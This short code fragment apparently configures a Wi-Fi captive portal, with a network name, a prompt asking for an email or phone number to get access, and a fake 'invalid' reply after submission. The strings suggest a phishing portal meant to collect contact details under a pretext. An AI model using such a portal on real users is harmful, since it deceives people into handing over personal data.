...
// Default SSID name
const char* SSID_NAME = "DO NOT CONNECT";

// Default main strings
#define SUBTITLE "Router info."
#define TITLE "Verify"
#define BODY "Enter email or phone number to access wifi network"
#define POST_TITLE "Verifying..."
#define POST_BODY "Your email or phone number is invalid</br>Thank you."
